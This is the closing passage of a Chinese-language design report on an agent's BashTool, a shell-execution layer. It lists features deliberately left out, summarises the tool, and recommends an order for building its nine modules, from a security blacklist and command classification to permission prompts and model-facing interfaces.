- **不会做命令缓存/记忆**。重复命令重跑是预期，bash_task 的`output`缓存已经够用。
- **不会引入 pty 依赖**。前面解释过——成本/收益不匹配。

---

## 10. 一句话总结

**BashTool 不是"在 agent 里 subprocess.run"——它是一个在多轮长会话里安全、可观察、可授权地把 LLM 的命令意图翻译成系统调用的执行层**。9 个模块每个都解一个具体问题，加起来填上单进程 subprocess 调用在长会话场景下的所有缝隙。

如果你要复刻一份，按这个顺序写最不容易卡：

1. 先`bash_security`（黑名单）+`bash_classify`（分类）——这俩没依赖
2. 再`bash_shell`（shell 检测+包装）——开始跨平台
3. 再`bash_session`（cwd 持久化）——伪持久化是关键技巧
4. 再`bash_output`（截断落盘）——给后续大命令铺垫
5. 再`bash_tool`（前台执行）——这时候你已经有一个能用的 BashTool
6. 再`bash_background`（后台 + 注册表）——加复杂度
7. 再`bash_permission`（allowlist + 弹窗）——加用户交互
8. 最后`bash_prompt` + `bash_task_tool` + `bash_permission_tool`——给模型用的接口

每一步都能独立测试、独立部署，整套加起来才是完整的 BashTool。这个分层就是这份报告 30 多个决策的具象化。
